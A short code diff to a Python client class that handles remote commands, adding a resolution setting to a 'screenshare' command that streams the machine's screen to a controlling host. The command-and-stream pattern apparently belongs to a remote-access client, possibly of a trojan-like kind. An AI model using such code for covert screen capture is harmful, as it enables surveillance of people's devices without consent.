@@ -125,7 +125,7 @@ class SCRIPT_CLIENT:
             elif command == 'screenshare':
                 try:
                     from vidstream import ScreenShareClient
-                    screen = ScreenShareClient(self.host, 8080)
+                    screen = ScreenShareClient(self.host, 8080, (1280, 720))
                     screen.start_stream()
                     self.s.send("screenshare_started".encode())  # Codifique a mensagem de erro em bytes
                 except Exception as e:
